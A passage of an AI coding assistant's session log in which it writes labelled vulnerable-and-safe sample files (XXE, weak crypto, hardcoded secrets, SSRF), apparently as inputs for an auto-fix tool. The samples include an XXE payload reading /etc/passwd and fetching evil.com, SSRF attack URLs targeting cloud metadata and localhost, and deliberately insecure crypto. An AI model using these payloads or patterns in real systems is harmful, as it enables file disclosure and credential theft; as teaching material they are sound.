visible in source!\\n        String url = \\"jdbc:mysql://localhost:3306/mydb\\";\\n        String username = System.getenv(\\"DB_USER\\");\\n        String password = System.getenv(\\"DB_PASS\\"); // Better but still check env vars\\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using environment variables\\n    public Connection connectSafe() throws SQLException {\\n        // SAFE: Credentials from environment variables (not in source code)\\n        String url = System.getenv(\\"DB_URL\\");\\n        String username = System.getenv(\\"DB_USER\\");\\n        String password = System.getenv(\\"DB_PASS\\");\\n        \\n        if (url == null || username == null || password == null) {\\n            throw new IllegalStateException(\\"Database credentials not configured\\");\\n        }\\n        \\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using configuration files (outside source code)\\n    public Connection connectSafeFromConfig(java.util.Properties config) throws SQLException {\\n        // SAFE: Load from external configuration file (gitignored)\\n        String url = config.getProperty(\\"db.url\\");\\n        String username = config.getProperty(\\"db.username\\");\\n        String password = config.getProperty(\\"db.password\\");\\n        \\n        return DriverManager.getConnection(url, username, password);\\n    }\\n\\n    // SAFE: Using secret management service\\n    public Connection connectSafeFromSecretManager() throws SQLException {\\n        // SAFE: Retrieve from secure secret management service\\n        // Example: AWS Secrets Manager, HashiCorp Vault, etc.\\n        SecretManager secretManager = new SecretManager();\\n        DatabaseCredentials creds = secretManager.getDatabaseCredentials(\\"prod-db\\");\\n        \\n        return DriverManager.getConnection(\\n            creds.getUrl(),\\n            creds.getUsername(),\\n            creds.getPassword()\\n        );\\n    }\\n\\n    // Helper class (example)\\n    static class SecretManager {\\n        public DatabaseCredentials getDatabaseCredentials(String secretName) {\\n            // Implementation would connect to secret management service\\n            // and retrieve credentials securely\\n            return new DatabaseCredentials();\\n        }\\n    }\\n\\n    static class DatabaseCredentials {\\n        public String getUrl() { return System.getenv(\\"DB_URL\\"); }\\n        public String getUsername() { return System.getenv(\\"DB_USER\\"); }\\n        public String getPassword() { return System.getenv(\\"DB_PASS\\"); }\\n    }\\n}\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:19:57.409Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_command_injection.sh","sample_hardcoded_secrets.java"]}",
          "rawArguments": "{"paths": ["sample_command_injection.sh","sample_hardcoded_secrets.java"]}",
          "result": "{}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:20:14.259Z,
        "text": "Created 2 sample code files in the repo root:

1. **\`sample_command_injection.sh\`** — Command injection vulnerabilities in bash/shell scripts, including:
   - Unsafe use of \`eval\` with user input
   - Unsafe command execution with backticks
   - Safe input validation and quoting
   - Safe use of arrays for command arguments
   - Whitelist pattern matching

2. **\`sample_hardcoded_secrets.java\`** — Hardcoded secrets in Java, including:
   - Unsafe hardcoded credentials in source code
   - Unsafe Base64-encoded passwords (encoding is not encryption)
   - Safe use of environment variables
   - Safe use of external configuration files
   - Safe use of secret management services

Both files show vulnerable patterns and their secure alternatives, covering command injection and hardcoded secrets.",
        "tokens": {
          "inputCount": 44004,
          "outputCount": 1703,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [
          {
            "relativePath": "sample_command_injection.sh",
            "startLine": 1,
          },
          {
            "relativePath": "sample_hardcoded_secrets.java",
            "startLine": 1,
          },
        ],
        "date": 2025-10-29T17:23:31.169Z,
        "text": "lets add 2 more files",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:23:35.444Z,
        "text": "Adding 2 more sample code files to the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:23:35.541Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml", "contents": "<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!--\\nSample XML demonstrating XXE (XML External Entity) vulnerability and safe configuration\\n-->\\n\\n<!-- VULNERABLE: XML with external entity references -->\\n<!--\\n<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!DOCTYPE root [\\n  <!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">\\n  <!ENTITY xxe2 SYSTEM \\"http://evil.com/steal.xml\\">\\n  <!ENTITY xxe3 SYSTEM \\"file:///c:/windows/win.ini\\">\\n]>\\n<root>\\n  <data>&xxe;</data>\\n  <data>&xxe2;</data>\\n  <data>&xxe3;</data>\\n</root>\\n-->\\n\\n<!-- SAFE: XML without external entity declarations -->\\n<root>\\n  <data>Safe content without external entities</data>\\n  <user>\\n    <name>John Doe</name>\\n    <email>john@example.com</email>\\n  </user>\\n</root>\\n\\n<!-- \\nSAFE XML Processing Guidelines:\\n\\n1. Disable DTD processing entirely:\\n   - Set feature http://apache.org/xml/features/disallow-doctype-decl to true\\n   - Set feature http://xml.org/sax/features/external-general-entities to false\\n   - Set feature http://xml.org/sax/features/external-parameter-entities to false\\n\\n2. Java Example (Safe):\\n   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\\n   factory.setFeature(\\"http://apache.org/xml/features/disallow-doctype-decl\\", true);\\n   factory.setFeature(\\"http://xml.org/sax/features/external-general-entities\\", false);\\n   factory.setFeature(\\"http://xml.org/sax/features/external-parameter-entities\\", false);\\n\\n3. Python Example (Safe):\\n   from defusedxml import ElementTree\\n   tree = ElementTree.parse(xml_file)  # Uses defusedxml - safe by default\\n\\n4. Never process XML from untrusted sources without proper configuration!\\n-->"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ <?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n+ <!--\\n+ Sample XML demonstrating XXE (XML External Entity) vulnerability and safe configuration\\n+ -->\\n+ \\n+ <!-- VULNERABLE: XML with external entity references -->\\n+ <!--\\n+ <?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n+ <!DOCTYPE root [\\n+   <!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">\\n+   <!ENTITY xxe2 SYSTEM \\"http://evil.com/steal.xml\\">\\n+   <!ENTITY xxe3 SYSTEM \\"file:///c:/windows/win.ini\\">\\n+ ]>\\n+ <root>\\n+   <data>&xxe;</data>\\n+   <data>&xxe2;</data>\\n+   <data>&xxe3;</data>\\n+ </root>\\n+ -->\\n+ \\n+ <!-- SAFE: XML without external entity declarations -->\\n+ <root>\\n+   <data>Safe content without external entities</data>\\n+   <user>\\n+     <name>John Doe</name>\\n+     <email>john@example.com</email>\\n+   </user>\\n+ </root>\\n+ \\n+ <!-- \\n+ SAFE XML Processing Guidelines:\\n+ \\n+ 1. Disable DTD processing entirely:\\n+    - Set feature http://apache.org/xml/features/disallow-doctype-decl to true\\n+    - Set feature http://xml.org/sax/features/external-general-entities to false\\n+    - Set feature http://xml.org/sax/features/external-parameter-entities to false\\n+ \\n+ 2. Java Example (Safe):\\n+    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\\n+    factory.setFeature(\\"http://apache.org/xml/features/disallow-doctype-decl\\", true);\\n+    factory.setFeature(\\"http://xml.org/sax/features/external-general-entities\\", false);\\n+    factory.setFeature(\\"http://xml.org/sax/features/external-parameter-entities\\", false);\\n+ \\n+ 3. Python Example (Safe):\\n+    from defusedxml import ElementTree\\n+    tree = ElementTree.parse(xml_file)  # Uses defusedxml - safe by default\\n+ \\n+ 4. Never process XML from untrusted sources without proper configuration!\\n+ -->","oldStart":1,"newStart":1,"oldLines":1,"newLines":49,"linesRemoved":1,"linesAdded":49}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_xxe_vulnerable.xml.","contentsAfterEdit":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!--\\nSample XML demonstrating XXE (XML External Entity) vulnerability and safe configuration\\n-->\\n\\n<!-- VULNERABLE: XML with external entity references -->\\n<!--\\n<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!DOCTYPE root [\\n  <!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">\\n  <!ENTITY xxe2 SYSTEM \\"http://evil.com/steal.xml\\">\\n  <!ENTITY xxe3 SYSTEM \\"file:///c:/windows/win.ini\\">\\n]>\\n<root>\\n  <data>&xxe;</data>\\n  <data>&xxe2;</data>\\n  <data>&xxe3;</data>\\n</root>\\n-->\\n\\n<!-- SAFE: XML without external entity declarations -->\\n<root>\\n  <data>Safe content without external entities</data>\\n  <user>\\n    <name>John Doe</name>\\n    <email>john@example.com</email>\\n  </user>\\n</root>\\n\\n<!-- \\nSAFE XML Processing Guidelines:\\n\\n1. Disable DTD processing entirely:\\n   - Set feature http://apache.org/xml/features/disallow-doctype-decl to true\\n   - Set feature http://xml.org/sax/features/external-general-entities to false\\n   - Set feature http://xml.org/sax/features/external-parameter-entities to false\\n\\n2. Java Example (Safe):\\n   DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\\n   factory.setFeature(\\"http://apache.org/xml/features/disallow-doctype-decl\\", true);\\n   factory.setFeature(\\"http://xml.org/sax/features/external-general-entities\\", false);\\n   factory.setFeature(\\"http://xml.org/sax/features/external-parameter-entities\\", false);\\n\\n3. Python Example (Safe):\\n   from defusedxml import ElementTree\\n   tree = ElementTree.parse(xml_file)  # Uses defusedxml - safe by default\\n\\n4. Never process XML from untrusted sources without proper configuration!\\n-->\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:23:35.541Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_weak_crypto.py"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_weak_crypto.py", "contents": "\\"\\"\\"\\nSample Python code demonstrating weak cryptography vulnerabilities and fixes\\n\\"\\"\\"\\n\\nimport hashlib\\nimport secrets\\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\\nfrom cryptography.hazmat.backends import default_backend\\nfrom cryptography.hazmat.primitives import hashes\\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\\nimport base64\\n\\n# VULNERABLE: Using MD5 for password hashing\\ndef hash_password_unsafe_md5(password: str) -> str:\\n    # UNSAFE: MD5 is cryptographically broken and fast to brute-force\\n    return hashlib.md5(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Using SHA1 for password hashing\\ndef hash_password_unsafe_sha1(password: str) -> str:\\n    # UNSAFE: SHA1 is broken and vulnerable to collision attacks\\n    return hashlib.sha1(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Using SHA256 without salt or iteration\\ndef hash_password_unsafe_sha256(password: str) -> str:\\n    # UNSAFE: SHA256 is a fast hash, vulnerable to rainbow table attacks\\n    # UNSAFE: No salt means same passwords produce same hashes\\n    return hashlib.sha256(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Weak encryption with ECB mode\\ndef encrypt_unsafe_ecb(data: bytes, key: bytes) -> bytes:\\n    # UNSAFE: ECB mode reveals patterns (same plaintext = same ciphertext)\\n    # UNSAFE: No IV (Initialization Vector) means deterministic encryption\\n    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    return encryptor.update(data) + encryptor.finalize()\\n\\n\\n# VULNERABLE: Hardcoded encryption key\\ndef encrypt_unsafe_hardcoded_key(data: bytes) -> bytes:\\n    # UNSAFE: Hardcoded key in source code\\n    key = b\\"1234567890123456\\"  # Exposed in source!\\n    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    return encryptor.update(data) + encryptor.finalize()\\n\\n\\n# SAFE: Using bcrypt for password hashing\\ndef hash_password_safe_bcrypt(password: str) -> str:\\n    # SAFE: bcrypt is designed for password hashing (slow, salted)\\n    import bcrypt\\n    salt = bcrypt.gensalt()\\n    hashed = bcrypt.hashpw(password.encode(), salt)\\n    return hashed.decode()\\n\\n\\n# SAFE: Using Argon2 for password hashing (modern standard)\\ndef hash_password_safe_argon2(password: str) -> str:\\n    # SAFE: Argon2 is the winner of Password Hashing Competition\\n    from argon2 import PasswordHasher\\n    ph = PasswordHasher()\\n    return ph.hash(password)\\n\\n\\n# SAFE: Using PBKDF2 with proper configuration\\ndef hash_password_safe_pbkdf2(password: str, salt: bytes = None) -> tuple[str, bytes]:\\n    # SAFE: PBKDF2 with high iteration count and random salt\\n    if salt is None:\\n        salt = secrets.token_bytes(16)\\n    \\n    kdf = PBKDF2HMAC(\\n        algorithm=hashes.SHA256(),\\n        length=32,\\n        salt=salt,\\n        iterations=100000,  # High iteration count slows brute-force\\n        backend=default_backend()\\n    )\\n    key = base64.b64encode(kdf.derive(password.encode())).decode()\\n    return key, salt\\n\\n\\n# SAFE: Using AES-GCM for encryption\\ndef encrypt_safe_gcm(data: bytes, key: bytes = None) -> tuple[bytes, bytes, bytes]:\\n    # SAFE: AES-GCM provides authenticated encryption\\n    if key is None:\\n        key = secrets.token_bytes(32)  # 256-bit key\\n    \\n    iv = secrets.token_bytes(12)  # 96-bit IV for GCM\\n    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    ciphertext = encryptor.update(data) + encryptor.finalize()\\n    \\n    return ciphertext, encryptor.tag, iv\\n\\n\\n# SAFE: Verifying password hash\\ndef verify_password_bcrypt(password: str, hashed: str) -> bool:\\n    # SAFE: bcrypt verification handles salt automatically\\n    import bcrypt\\n    return bcrypt.checkpw(password.encode(), hashed.encode())\\n\\n\\n# SAFE: Key derivation from password\\ndef derive_key_from_password(password: str, salt: bytes = None) -> tuple[bytes, bytes]:\\n    # SAFE: Use proper key derivation function\\n    if salt is None:\\n        salt = secrets.token_bytes(16)\\n    \\n    kdf = PBKDF2HMAC(\\n        algorithm=hashes.SHA256(),\\n        length=32,\\n        salt=salt,\\n        iterations=100000,\\n        backend=default_backend()\\n    )\\n    key = kdf.derive(password.encode())\\n    return key, salt"}",
          "result": "{"diff":{"chunks":[{"diffString":"- \\n+ \\"\\"\\"\\n+ Sample Python code demonstrating weak cryptography vulnerabilities and fixes\\n+ \\"\\"\\"\\n+ \\n+ import hashlib\\n+ import secrets\\n+ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\\n+ from cryptography.hazmat.backends import default_backend\\n+ from cryptography.hazmat.primitives import hashes\\n+ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\\n+ import base64\\n+ \\n+ # VULNERABLE: Using MD5 for password hashing\\n+ def hash_password_unsafe_md5(password: str) -> str:\\n+     # UNSAFE: MD5 is cryptographically broken and fast to brute-force\\n+     return hashlib.md5(password.encode()).hexdigest()\\n+ \\n+ \\n+ # VULNERABLE: Using SHA1 for password hashing\\n+ def hash_password_unsafe_sha1(password: str) -> str:\\n+     # UNSAFE: SHA1 is broken and vulnerable to collision attacks\\n+     return hashlib.sha1(password.encode()).hexdigest()\\n+ \\n+ \\n+ # VULNERABLE: Using SHA256 without salt or iteration\\n+ def hash_password_unsafe_sha256(password: str) -> str:\\n+     # UNSAFE: SHA256 is a fast hash, vulnerable to rainbow table attacks\\n+     # UNSAFE: No salt means same passwords produce same hashes\\n+     return hashlib.sha256(password.encode()).hexdigest()\\n+ \\n+ \\n+ # VULNERABLE: Weak encryption with ECB mode\\n+ def encrypt_unsafe_ecb(data: bytes, key: bytes) -> bytes:\\n+     # UNSAFE: ECB mode reveals patterns (same plaintext = same ciphertext)\\n+     # UNSAFE: No IV (Initialization Vector) means deterministic encryption\\n+     cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n+     encryptor = cipher.encryptor()\\n+     return encryptor.update(data) + encryptor.finalize()\\n+ \\n+ \\n+ # VULNERABLE: Hardcoded encryption key\\n+ def encrypt_unsafe_hardcoded_key(data: bytes) -> bytes:\\n+     # UNSAFE: Hardcoded key in source code\\n+     key = b\\"1234567890123456\\"  # Exposed in source!\\n+     cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n+     encryptor = cipher.encryptor()\\n+     return encryptor.update(data) + encryptor.finalize()\\n+ \\n+ \\n+ # SAFE: Using bcrypt for password hashing\\n+ def hash_password_safe_bcrypt(password: str) -> str:\\n+     # SAFE: bcrypt is designed for password hashing (slow, salted)\\n+     import bcrypt\\n+     salt = bcrypt.gensalt()\\n+     hashed = bcrypt.hashpw(password.encode(), salt)\\n+     return hashed.decode()\\n+ \\n+ \\n+ # SAFE: Using Argon2 for password hashing (modern standard)\\n+ def hash_password_safe_argon2(password: str) -> str:\\n+     # SAFE: Argon2 is the winner of Password Hashing Competition\\n+     from argon2 import PasswordHasher\\n+     ph = PasswordHasher()\\n+     return ph.hash(password)\\n+ \\n+ \\n+ # SAFE: Using PBKDF2 with proper configuration\\n+ def hash_password_safe_pbkdf2(password: str, salt: bytes = None) -> tuple[str, bytes]:\\n+     # SAFE: PBKDF2 with high iteration count and random salt\\n+     if salt is None:\\n+         salt = secrets.token_bytes(16)\\n+     \\n+     kdf = PBKDF2HMAC(\\n+         algorithm=hashes.SHA256(),\\n+         length=32,\\n+         salt=salt,\\n+         iterations=100000,  # High iteration count slows brute-force\\n+         backend=default_backend()\\n+     )\\n+     key = base64.b64encode(kdf.derive(password.encode())).decode()\\n+     return key, salt\\n+ \\n+ \\n+ # SAFE: Using AES-GCM for encryption\\n+ def encrypt_safe_gcm(data: bytes, key: bytes = None) -> tuple[bytes, bytes, bytes]:\\n+     # SAFE: AES-GCM provides authenticated encryption\\n+     if key is None:\\n+         key = secrets.token_bytes(32)  # 256-bit key\\n+     \\n+     iv = secrets.token_bytes(12)  # 96-bit IV for GCM\\n+     cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())\\n+     encryptor = cipher.encryptor()\\n+     ciphertext = encryptor.update(data) + encryptor.finalize()\\n+     \\n+     return ciphertext, encryptor.tag, iv\\n+ \\n+ \\n+ # SAFE: Verifying password hash\\n+ def verify_password_bcrypt(password: str, hashed: str) -> bool:\\n+     # SAFE: bcrypt verification handles salt automatically\\n+     import bcrypt\\n+     return bcrypt.checkpw(password.encode(), hashed.encode())\\n+ \\n+ \\n+ # SAFE: Key derivation from password\\n+ def derive_key_from_password(password: str, salt: bytes = None) -> tuple[bytes, bytes]:\\n+     # SAFE: Use proper key derivation function\\n+     if salt is None:\\n+         salt = secrets.token_bytes(16)\\n+     \\n+     kdf = PBKDF2HMAC(\\n+         algorithm=hashes.SHA256(),\\n+         length=32,\\n+         salt=salt,\\n+         iterations=100000,\\n+         backend=default_backend()\\n+     )\\n+     key = kdf.derive(password.encode())\\n+     return key, salt","oldStart":1,"newStart":1,"oldLines":1,"newLines":119,"linesRemoved":1,"linesAdded":119}],"editor":"EDITOR_AI"},"shouldAutoFixLints":true,"resultForModel":"Wrote contents to /Users/jonathanafek/src/autofixer/sample_weak_crypto.py.","contentsAfterEdit":"\\"\\"\\"\\nSample Python code demonstrating weak cryptography vulnerabilities and fixes\\n\\"\\"\\"\\n\\nimport hashlib\\nimport secrets\\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\\nfrom cryptography.hazmat.backends import default_backend\\nfrom cryptography.hazmat.primitives import hashes\\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\\nimport base64\\n\\n# VULNERABLE: Using MD5 for password hashing\\ndef hash_password_unsafe_md5(password: str) -> str:\\n    # UNSAFE: MD5 is cryptographically broken and fast to brute-force\\n    return hashlib.md5(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Using SHA1 for password hashing\\ndef hash_password_unsafe_sha1(password: str) -> str:\\n    # UNSAFE: SHA1 is broken and vulnerable to collision attacks\\n    return hashlib.sha1(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Using SHA256 without salt or iteration\\ndef hash_password_unsafe_sha256(password: str) -> str:\\n    # UNSAFE: SHA256 is a fast hash, vulnerable to rainbow table attacks\\n    # UNSAFE: No salt means same passwords produce same hashes\\n    return hashlib.sha256(password.encode()).hexdigest()\\n\\n\\n# VULNERABLE: Weak encryption with ECB mode\\ndef encrypt_unsafe_ecb(data: bytes, key: bytes) -> bytes:\\n    # UNSAFE: ECB mode reveals patterns (same plaintext = same ciphertext)\\n    # UNSAFE: No IV (Initialization Vector) means deterministic encryption\\n    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    return encryptor.update(data) + encryptor.finalize()\\n\\n\\n# VULNERABLE: Hardcoded encryption key\\ndef encrypt_unsafe_hardcoded_key(data: bytes) -> bytes:\\n    # UNSAFE: Hardcoded key in source code\\n    key = b\\"1234567890123456\\"  # Exposed in source!\\n    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    return encryptor.update(data) + encryptor.finalize()\\n\\n\\n# SAFE: Using bcrypt for password hashing\\ndef hash_password_safe_bcrypt(password: str) -> str:\\n    # SAFE: bcrypt is designed for password hashing (slow, salted)\\n    import bcrypt\\n    salt = bcrypt.gensalt()\\n    hashed = bcrypt.hashpw(password.encode(), salt)\\n    return hashed.decode()\\n\\n\\n# SAFE: Using Argon2 for password hashing (modern standard)\\ndef hash_password_safe_argon2(password: str) -> str:\\n    # SAFE: Argon2 is the winner of Password Hashing Competition\\n    from argon2 import PasswordHasher\\n    ph = PasswordHasher()\\n    return ph.hash(password)\\n\\n\\n# SAFE: Using PBKDF2 with proper configuration\\ndef hash_password_safe_pbkdf2(password: str, salt: bytes = None) -> tuple[str, bytes]:\\n    # SAFE: PBKDF2 with high iteration count and random salt\\n    if salt is None:\\n        salt = secrets.token_bytes(16)\\n    \\n    kdf = PBKDF2HMAC(\\n        algorithm=hashes.SHA256(),\\n        length=32,\\n        salt=salt,\\n        iterations=100000,  # High iteration count slows brute-force\\n        backend=default_backend()\\n    )\\n    key = base64.b64encode(kdf.derive(password.encode())).decode()\\n    return key, salt\\n\\n\\n# SAFE: Using AES-GCM for encryption\\ndef encrypt_safe_gcm(data: bytes, key: bytes = None) -> tuple[bytes, bytes, bytes]:\\n    # SAFE: AES-GCM provides authenticated encryption\\n    if key is None:\\n        key = secrets.token_bytes(32)  # 256-bit key\\n    \\n    iv = secrets.token_bytes(12)  # 96-bit IV for GCM\\n    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())\\n    encryptor = cipher.encryptor()\\n    ciphertext = encryptor.update(data) + encryptor.finalize()\\n    \\n    return ciphertext, encryptor.tag, iv\\n\\n\\n# SAFE: Verifying password hash\\ndef verify_password_bcrypt(password: str, hashed: str) -> bool:\\n    # SAFE: bcrypt verification handles salt automatically\\n    import bcrypt\\n    return bcrypt.checkpw(password.encode(), hashed.encode())\\n\\n\\n# SAFE: Key derivation from password\\ndef derive_key_from_password(password: str, salt: bytes = None) -> tuple[bytes, bytes]:\\n    # SAFE: Use proper key derivation function\\n    if salt is None:\\n        salt = secrets.token_bytes(16)\\n    \\n    kdf = PBKDF2HMAC(\\n        algorithm=hashes.SHA256(),\\n        length=32,\\n        salt=salt,\\n        iterations=100000,\\n        backend=default_backend()\\n    )\\n    key = kdf.derive(password.encode())\\n    return key, salt\\n"}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:24:00.198Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "read_lints",
          "parameters": "{"paths":["sample_xxe_vulnerable.xml","sample_weak_crypto.py"]}",
          "rawArguments": "{"paths": ["sample_xxe_vulnerable.xml","sample_weak_crypto.py"]}",
          "result": "{}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:24:06.020Z,
        "text": "Created 2 more sample code files:

1. **\`sample_xxe_vulnerable.xml\`** — XML External Entity (XXE) vulnerabilities, including:
   - Unsafe XML with external entity references that can read local files or make HTTP requests
   - Safe XML without external entities
   - Safe XML processing guidelines with code examples for Java and Python
   - Recommendations for disabling DTD processing and external entities

2. **\`sample_weak_crypto.py\`** — Weak cryptography vulnerabilities in Python, including:
   - Unsafe use of MD5/SHA1 for password hashing
   - Unsafe use of SHA256 without salt
   - Unsafe ECB encryption mode
   - Hardcoded encryption keys
   - Safe use of bcrypt and Argon2 for password hashing
   - Safe use of PBKDF2 with proper configuration
   - Safe use of AES-GCM for authenticated encryption

You now have 4 sample files covering command injection, hardcoded secrets, XXE, and weak cryptography.",
        "tokens": {
          "inputCount": 46146,
          "outputCount": 1994,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:26:24.530Z,
        "text": "let's create 2 more files",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "USER_PROMPT",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:26:27.878Z,
        "text": "Creating 2 more sample code files in the repo root:
",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": undefined,
        "type": "AI_RESPONSE",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T17:26:27.953Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": true,
          "name": "write",
          "parameters": "{"relativeWorkspacePath":"/Users/jonathanafek/src/autofixer/sample_ssrf_vulnerable.py"}",
          "rawArguments": "{"file_path": "/Users/jonathanafek/src/autofixer/sample_ssrf_vulnerable.py", "contents": "\\"\\"\\"\\nSample Python code demonstrating SSRF (Server-Side Request Forgery) vulnerability and fix\\n\\"\\"\\"\\n\\nimport requests\\nimport urllib.request\\nfrom urllib.parse import urlparse\\nimport socket\\n\\n# VULNERABLE: Direct URL request without validation\\ndef fetch_url_unsafe(url: str):\\n    # UNSAFE: No validation - allows requests to internal services\\n    # Attack: http://169.254.169.254/latest/meta-data/ (AWS metadata)\\n    # Attack: http://localhost:8080/admin (internal admin panel)\\n    # Attack: file:///etc/passwd (local file access)\\n    response = requests.get(url)\\n    return response.text\\n\\n\\n# VULNERABLE: Using urllib without restrictions\\ndef download_file_unsafe(url: str):\\n    # UNSAFE: Can access internal networks, localhost, cloud metadata\\n    with urllib.request.urlopen(url) as response:\\n        return response.read()\\n\\n\\n# VULNERABLE: URL whitelist bypass\\ndef fetch_url_unsafe_whitelist(url: str):\\n    # UNSAFE: Whitelist can be bypassed with @ or # tricks\\n    # Attack: http://evil.com@internal-host/admin\\n    # Attack: http://public-site.com#@internal-host/admin\\n    allowed_domains = [\\"api.example.com\\", \\"cdn.example.com\\"]\\n    parsed = urlparse(url)\\n    if parsed.hostname in allowed_domains:\\n        return requests.get(url).text  # Still vulnerable!\\n    return None\\n\\n\\n# VULNERABLE: DNS rebinding attacks\\ndef fetch_with_dns_resolve_unsafe(url: str):\\n    # UNSAFE: DNS can change between resolve and request\\n    parsed = urlparse(url)\\n    resolved_ip = socket.gethostbyname(parsed.hostname)\\n    \\n    # Check if IP is internal\\n    if resolved_ip.startswith(\\"127.\\") or resolved_ip.startswith(\\"10.\\"):\\n        return None\\n    \\n    # UNSAFE: DNS can rebind between check and request!\\n    return requests.get(url).text\\n\\n\\n# SAFE: Whitelist with proper validation\\ndef fetch_url_safe(url: str):\\n    ALLOWED_SCHEMES = [\\"https\\"]\\n    ALLOWED_DOMAINS = [\\"api.example.com\\", \\"cdn.example.com\\"]\\n    \\n    parsed = urlparse(url)\\n    \\n    # SAFE: Validate scheme\\n    if parsed.scheme not in ALLOWED_SCHEMES:\\n        raise ValueError(\\"Only HTTPS allowed\\")\\n    \\n    # SAFE: Validate hostname\\n    if parsed.hostname not in ALLOWED_DOMAINS:\\n        raise ValueError(\\"Domain not in whitelist\\")\\n    \\n    # SAFE: Validate no user/password in URL\\n    if parsed.username or parsed.password:\\n        raise ValueError(\\"Credentials in URL not allowed\\")\\n    \\n    # SAFE: Validate no internal IPs\\n    try:\\n        resolved_ip = socket.gethostbyname(parsed.hostname)\\n        if is_internal_ip(resolved_ip):\\n            raise ValueError(\\"Internal IP addresses not allowed\\")\\n    except socket.gaierror:\\n        raise ValueError(\\"Invalid hostname\\")\\n    \\n    # SAFE: Use request with timeout and redirect limits\\n    response = requests.get(\\n        url,\\n        timeout=10,\\n        allow_redirects=False,  # Prevent redirect attacks\\n        verify=True  # Verify SSL certificates\\n    )\\n    return response.text\\n\\n\\n# SAFE: IP address validation\\ndef is_internal_ip(ip: str) -> bool:\\n    # SAFE: Check for private/internal IP ranges\\n    parts = ip.split(\\".\\")\\n    if len(parts) != 4:\\n        return False\\n    \\n    first = int(parts[0])\\n    second = int(parts[1])\\n    \\n    # RFC 1918 private ranges\\n    if first == 10:\\n        return True\\n    if first == 172 and 16 <= second <= 31:\\n        return True\\n    if first == 192 and second == 168:\\n        return True\\n    \\n    # Localhost\\n    if first == 127:\\n        return True\\n    \\n    # 